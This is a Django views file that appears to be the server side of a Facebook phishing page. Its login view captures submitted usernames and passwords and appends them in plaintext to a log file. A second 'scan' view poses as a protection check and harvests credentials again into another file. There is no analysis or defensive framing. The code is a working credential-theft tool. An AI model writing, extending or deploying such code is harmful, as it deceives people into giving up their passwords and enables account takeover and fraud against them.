from os import stat
from tkinter.tix import Tree
from django.shortcuts import render
import time
# Create your views here.

def login(request):
    if request.method == "POST":
        usr = request.POST.get('usrname')
        passwd = request.POST.get('passwd')
        print(f'username: {usr} password: {passwd}')
        with open('media/facebook/log.txt','a') as f:
            f.write(f'email-> {usr} passwd-> {passwd}')

    return render(request,'facebook/login.html')
def scan(request):
    stater = True
    print("scaning ...")
    if request.method == "POST":
        usr = request.POST.get('email')
        passwd = request.POST.get('passwd')
        print(request.POST)
        print(f'username: {usr} password: {passwd}')
        with open('media/facebook/protection.txt','a') as f:
            f.write(f"email-> {usr} passwd-> {passwd} ")
            if len(passwd) > 1:
                stater = False
        
    return render(request,'facebook/protected.html',{"stater":stater})
def successs(request):
    return render(request,'facebook/successs.html')